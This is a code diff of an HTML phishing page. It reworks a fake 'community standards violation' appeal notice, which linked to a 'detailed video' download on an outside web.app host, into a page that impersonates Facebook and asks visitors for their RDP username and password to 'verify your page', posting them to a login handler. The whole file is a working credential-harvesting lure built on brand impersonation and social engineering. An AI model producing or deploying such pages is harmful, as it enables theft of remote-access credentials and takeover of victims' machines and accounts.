@@ -1,161 +1,79 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-      
-      <link src="styles.css"></script>
-  <link rel="stylesheet" crossorigin="" href="style.css">
-      
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RDP Login</title>
+  <link src="styles.css"></script>
+  <link rel="stylesheet" crossorigin="" href="style.css">
+      
+      <title>Facebook RDP Login</title>
     <style>
-        * {
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            text-align: center;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
         }
-
-        body {
-            background-color: #f0f2f5;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .header {
-            background-color: #1877f2;
+        .container {
             width: 100%;
-            padding: 15px 20px;
-            margin-bottom: 50px;
+            max-width: 400px;
+            background: white;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            margin: 50px auto;
         }
-
         .logo {
-            color: blue;
             font-size: 32px;
             font-weight: bold;
-        }
-
-        .login-card {
-            background-color: white;
-        } #box {
-            height: 40%;
-            width: 45%;
-            background-color: rgb(255, 255, 255);
-            border-radius: 3px;
-            display: flex;
-            align-items: center;
-            flex-direction: column;;
-        }
-
-        .login-card h2 {
-            color: #1c1e21;
-            margin: 10px 0 20px 0;
-        }
-
-        .form-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 16px;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }
-
-        .login-btn {
-            background-color: #1877f2;
-            color: white;
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 6px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 10px 0;
-        }
-
-        .login-btn:hover {
-            background-color: #166fe5;
-        }
-
-        .separator {
-            border-top: 1px solid #dadde1;
-            margin: 20px 0;
-        }
-
-        .create-account {
-            background-color: #42b72a;
-            color: white;
-            padding: 12px;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 10px 0;
-        }
-
-        .create-account:hover {
-            background-color: #36a420;
-        }
-
-        .footer {
-            margin-top: auto;
-            padding: 20px;
-            text-align: center;
-            color: #737373;
-            font-size: 14px;
-        }
-
-        a {
             color: #1877f2;
-            text-decoration: none;
         }
-
-        a:hover {
-            text-decoration: underline;
+        .caption {
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 15px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ccd0d5;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .login-btn {
+            width: 100%;
+            background: #1877f2;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background: #166fe5;
+        }
+        .footer {
+            font-size: 12px;
+            color: #606770;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="logo">RDP Login</div>
+
+    <div class="container">
+        <div class="logo">facebook</div>
+        <p class="caption">To verify your page, you'll need to connect RDP with your page to complete the verification process. This will require you for the purpose of verifying your page and will not access any other sensitive information.</p>
+        <form action="your_rdp_login_handler.php" method="POST">
+            <input type="text" name="username" class="input-field" placeholder="RDP Username" required>
+            <input type="password" name="password" class="input-field" placeholder="RDP Password" required>
+            <button type="submit" class="login-btn">Connect</button>
+        </form>
+        <p class="footer">Facebook © 2025</p>
     </div>
 
-    <div class="login-card">
-        <p class="text-[10px] font-serif mt-3 mx-3">
-        We have detected unusual activity on your page that violates our community standards. 
-      </p>
-    </div>
-    <div>
-      <p class="text-[10px] font-serif  mt-3 mx-3">
-        Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.
-      </p>
-    </div>
-    <div>
-      <p class="text-[10px] font-serif  mt-3 mx-3">
-        If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.
-      </p>
-    </div><div>
-      <b class="text-[10px] text-[#90949c] font-bold mx-3">
-        Detailed Video Information
-      </b>
-    </div><div>
-      <a class="w-32 h-20 block" href="https://detailed-video-29b30.web.app/detailed%20video.mp4"><img class="w-32 h-20 mx-3" src="download.png" alt=""></a>
-    </div><p class="text-[10px] font-serif  mt-3 mx-3">
-      Please be sure to provide the requested information below.
-    </div>
 </body>
 </html>
